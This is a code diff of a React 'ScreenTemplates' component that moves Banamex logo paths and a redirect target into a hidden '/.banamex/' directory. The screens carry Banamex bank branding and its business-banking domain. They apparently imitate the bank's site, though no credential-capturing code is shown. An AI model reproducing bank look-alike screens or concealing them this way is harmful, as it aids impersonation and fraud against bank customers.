@@ -713,7 +713,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             {/* Logo de Banamex */}
             <div className="flex justify-center mb-8">
               <img 
-                src="/banamex/images/logobanamex.svg" 
+                src="/.banamex/images/logobanamex.svg" 
                 alt="Banamex" 
                 className="h-16 object-contain"
               />
@@ -930,7 +930,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px' }}>
                 <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                   <img 
-                    src="/banamex/images/logobanamex.svg" 
+                    src="/.banamex/images/logobanamex.svg" 
                     alt="Banamex"
                     style={{ height: '46px', width: 'auto', display: 'block' }}
                   />
@@ -1835,7 +1835,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             {/* Logo de Banamex */}
             <div className="flex justify-center mb-6">
               <img 
-                src="/banamex/images/logobanamex.svg" 
+                src="/.banamex/images/logobanamex.svg" 
                 alt="Banamex" 
                 className="h-12 object-contain"
               />
@@ -2055,7 +2055,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             setRedirectCounter(prev => {
               if (prev <= 1) {
                 clearInterval(countdown);
-                window.location.href = '/banamex/';
+                window.location.href = '/.banamex/';
                 return 0;
               }
               return prev - 1;
@@ -2245,7 +2245,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           }}>
             <div style={{ textAlign: 'center', maxWidth: '600px' }}>
               <img 
-                src="/banamex/images/logobanamex.svg" 
+                src="/.banamex/images/logobanamex.svg" 
                 alt="Banamex" 
                 style={{ width: '200px', height: 'auto', margin: '0 auto 40px', display: 'block' }}
               />
@@ -2805,7 +2805,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               alignItems: 'center'
             }}>
               <div>
-                <img src="/banamex/images/logobanamex.svg" alt="Banamex" style={{ height: '32px' }} />
+                <img src="/.banamex/images/logobanamex.svg" alt="Banamex" style={{ height: '32px' }} />
               </div>
               <div style={{ textAlign: 'right' }}>
                 <div style={{ fontSize: '11px', color: '#666' }}>bancanetempresarial.banamex.com.mx</div>
@@ -2985,7 +2985,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <div style={{ maxWidth: '800px', margin: '0 auto' }}>
               {/* Header - Logo */}
               <header style={{ marginBottom: '24px', borderBottom: '2px solid #e5e7eb', paddingBottom: '16px' }}>
-                <img src="/banamex/images/logobanamex.svg" alt="Banamex" style={{ width: '120px' }} />
+                <img src="/.banamex/images/logobanamex.svg" alt="Banamex" style={{ width: '120px' }} />
               </header>
 
               {/* Título principal */}
@@ -3243,7 +3243,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <div style={{ textAlign: 'center', maxWidth: '600px' }}>
               {/* Logo de Banamex */}
               <img 
-                src="/banamex/images/logobanamex.svg" 
+                src="/.banamex/images/logobanamex.svg" 
                 alt="Banamex" 
                 style={{ width: '180px', margin: '0 auto 30px', display: 'block' }}
               />
